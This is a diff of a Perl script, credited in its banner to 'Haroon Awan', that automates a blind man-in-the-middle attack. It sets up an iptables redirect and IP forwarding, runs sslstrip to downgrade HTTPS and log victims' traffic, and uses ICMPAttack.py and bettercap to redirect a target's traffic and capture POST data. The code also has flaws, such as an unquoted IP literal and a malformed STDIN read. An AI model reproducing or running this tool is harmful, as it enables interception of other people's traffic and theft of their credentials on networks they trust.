@@ -20,18 +20,36 @@
 
 #! /usr/bin/perl -w
 
-
 use strict;
 use warnings;
+use Term::ANSIColor;
 
-system("clear");
+system "clear";
+print color('bold white');
+print qq / 
 
-print "[ ! ] Setting up environment [ ! ]\n";
+	  	       .,ad88888ba,.
+ 		    .,ad8888888888888a,
+	       	    d8P'"'98888P''"98888b,   HACKING IS AN ILLUSION!
+       		    9b    d8888,    `9888B
+                  ,d88aaa8888888b,,,d888P'
+       	  	 d8888888888888888888888b
+       	   	d888888P8898888888888888P    	Coded By: Haroon Awan
+       		88888PP    9888888888888
+      	 	998PP       9888888888P'
+       		            339888P333
+       	        	        '3"
+/;
+
+print color('bold red'),"\n[ ~ ] Automatic HTTPS Network Injection for Blind MITM [ ~ ]\n";
+print color('bold blue'),"\n[ + ] Setting up environment\n\n";
+print color('reset');
+print color('bold green');
 
 my $tables;
 print "[ + ] You will have to uncomment iptables redirect.\n";
 print "[ + ] Inside nano use ctrl+o to save your changes ctrl+x to exit and continue the script.\n";
-print "[ + ] Would you like to open /etc/etter.conf to uncomment iptables redirect? (y/n)\n";
+print "[ + ] Would you like to open /etc/etter.conf to uncomment iptables redirect? (y/n): ";
 $tables=<STDIN>;
 chomp($tables);
     if ($tables eq "y"){
@@ -48,7 +66,7 @@ $redirect='sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j RE
 my $forward;
 print "[ + ] Checking to make sure ip forwarding is enabled\n";
 system ("cat /proc/sys/net/ipv4/ip_forward");
-print "[ + ] Does ip forward = 0? (y/n)\n";
+print "[ + ] Does ip forward = 0? (y/n): ";
 $forward=<STDIN>;
 chomp($forward);
     if ($forward eq "y"){
@@ -56,24 +74,25 @@ chomp($forward);
         system ("cat /proc/sys/net/ipv4/ip_forward");
 }
 
+
 # check to find out what the default gateway is
 my $default;
 system ("netstat -nr");
-    print "[ + ] What is the default gateway?\n";
+    print "[ + ] What is the default gateway: ";
     $default=<STDIN>;
     chomp($default);
 
 # check which network interface device
 my $interface;
 system ("ifconfig");
-    print "[ + ] Which network interface would you like to use?\n";
+    print "[ + ] Which network interface would you like to use: ";
     $interface=<STDIN>;
     chomp($interface);
 
 # check what your ip address is
 my $ip;
 system ("ifconfig $interface");
-    print "[ + ] What is your IP address?\n";
+    print "[ + ] What is your IP address: ";
     $ip=<STDIN>;
     chomp($ip);
 
@@ -83,12 +102,22 @@ my $ssl;
 my $log;
 print "[ + ] Starting SSL Strip.\n";
 print "[ + ] We have a few options for our parameters with SSL Strip.\n";
-print "[ + ] Here are you options: \nsniff all traffic, kill active sessions, log data (akl) \nkill, log, and sniff only https traffic (kl) \nlog https traffic only(l)\n";
+print "[ ~ ] Here are you options [ ~ ]  \n[ + ] Sniff all traffic and kill active sessions with log data (akl) \n[ + ] Kill, log and sniff only https traffic (kl) \n[ + ] Log https traffic only(l)\n";
     $ssl=<STDIN>;
     chomp($ssl);
-print "Enter name of the log file, it has to end with '.log'? (ex: strip.log )\n";
+print "Enter name of file end with .log\n";
     $log=<STDIN>;
     chomp($log);
+
+# parameters 
+#-w <filename>, --write=<filename> Specify file to log to (optional).
+#-p , --post                       Log only SSL POSTs. (default)
+#-s , --ssl                        Log all SSL traffic to and from server.
+#-a , --all                        Log all SSL and HTTP traffic to and from server.
+#-l <port>, --listen=<port>        Port to listen on (default 10000).
+#-f , --favicon                    Substitute a lock favicon on secure requests.
+#-k , --killsessions               Kill sessions in progress.
+
         if ($ssl eq "akl"){
             system ("sudo sslstrip -a -k -l 8080 -w $log ");
         }
@@ -101,7 +130,7 @@ print "Enter name of the log file, it has to end with '.log'? (ex: strip.log )\n
 
 # start following the sslstrip log using tail
 my $tail;
-print "[ + ] Do you want to start to follow the log file in real time? (y/n)\n";
+print "[ + ] Do you want to start to follow the log file in real time? (y/n): ";
     $tail=<STDIN&>;
     chomp($tail);    
     if ($tail eq "y"){
@@ -112,22 +141,36 @@ print "[ + ] Do you want to start to follow the log file in real time? (y/n)\n";
         print "[ + ] Script done. Time to wait.\n";
     }
 
+
 # start blind traffic hijacker
 my $blindarp;
 my $target;
 my $gateway;
+my $option;
 my $localhost;
 $localhost=127.0.0.1;
 print "[ + ] Enter Gateway? (y/n)\n";
     $gateway=<STDIN>;
     chomp($gateway);
-print "[ + ] Do you want to start a blind attack? (y/n)\n";
+print "[ + ] Do you want to start a blind attack? (y/n): ";
     $blindarp=<STDIN>;
     chomp($blindarp);
         if ($blindarp eq "y"){
-            print "[ + ] Enter the IP of the Target: \n";
+            print "[ + ] Enter the IP of the Target: ";
             $target=<STDIN>;
             chomp($target);
-                system ("sudo python ICMPAttack.py -v -i $interface -g 192.168.15.0 -t $target && bettercap -t $localhost --proxy -P POST");
-        }
-        else {}
+			     }
+            print "[ + ] Option 1 - Redirect victim traffic to localhost\n [ + ] Option 2 - Redirect victim traffic to localhost and use bettercap\n [ + ] Option 3 - Hack target traffic using bettercap";
+            $option=<STDIN>;
+            chomp($option);
+        if ($option eq "1") {
+                system ("sudo python ICMPAttack.py -v -i $interface -g $gateway -t $target");
+			    } 
+elsif($option eq "2") {
+                system ("sudo python ICMPAttack.py -v -i $interface -g $gateway -t $target && bettercap -t $localhost --proxy -P POST"); 
+		      } 
+elsif($option eq "3") {
+                system ("sudo bettercap -t $target --proxy -P POST");
+	              }
+else {}
+print color('reset');
